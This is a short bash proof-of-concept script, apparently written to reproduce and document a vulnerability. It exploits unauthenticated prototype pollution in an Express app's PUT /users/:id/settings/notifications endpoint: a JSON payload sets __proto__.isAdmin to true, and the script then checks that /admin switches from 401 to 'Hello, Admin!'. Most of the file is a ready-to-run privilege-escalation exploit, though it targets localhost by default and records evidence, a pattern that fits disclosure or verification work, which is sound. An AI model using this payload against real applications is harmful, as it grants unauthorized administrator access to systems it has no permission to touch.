#!/usr/bin/env bash
# Unauthenticated prototype pollution via PUT /users/:id/settings/notifications.
# Prereq: the Express app is listening on $BASE (default http://127.0.0.1:8094).
set -euo pipefail
cd "$(dirname "$0")"
BASE="${BASE:-http://127.0.0.1:8094}"
mkdir -p evidence
OUT=evidence/transcript.txt
: > "$OUT"

{
  echo "=== CONTROL: GET /admin with no cookie ==="
  curl -sS -D - "$BASE/admin" || true
  echo
  echo "=== EXPLOIT: PUT /users/1/settings/notifications ==="
  curl -sS -D - -X PUT \
    -H 'Content-Type: application/json' \
    --data '{"notificationType":"__proto__","notificationMode":"isAdmin","notificationModeValue":true}' \
    "$BASE/users/1/settings/notifications" || true
  echo
  echo "=== AFTER: GET /admin with no cookie ==="
  curl -sS -D - "$BASE/admin" || true
  echo
} | tee "$OUT"

python3 - <<'PY'
from pathlib import Path
text = Path("evidence/transcript.txt").read_text()
parts = text.split("=== ")
# Expect 401 before the PUT and "Hello, Admin!" after it.
before = parts[1] if len(parts) > 1 else ""
after = parts[3] if len(parts) > 3 else ""
ok = "401" in before and "Hello, Admin!" in after
print("reproduced=" + ("yes" if ok else "no"))
Path("evidence/result.json").write_text(
    '{"reproduced": "%s"}\n' % ("yes" if ok else "no")
)
if not ok:
    raise SystemExit(1)
PY
